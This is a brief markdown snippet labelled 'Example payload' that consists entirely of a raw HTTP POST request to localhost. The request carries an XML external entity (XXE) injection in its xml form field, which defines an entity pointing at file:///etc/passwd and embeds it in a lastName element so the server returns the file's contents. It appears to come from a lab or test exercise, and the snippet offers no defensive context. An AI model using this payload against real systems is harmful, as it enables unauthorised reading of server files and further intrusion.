# Example payload
```
POST / HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=85895d382d8ee07958a5cdc2d7a58b7e
Connection: close

xml=<!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+"file%3a///etc/passwd">]>%3CprofileUpdate%3E%3Ctitle%3EMr.%3C%2Ftitle%3E%3CfirstName%3Efname%3C%2FfirstName%3E%3ClastName%3Elna%26xxe%3bme%3C%2FlastName%3E%3C%2FprofileUpdate%3E
```
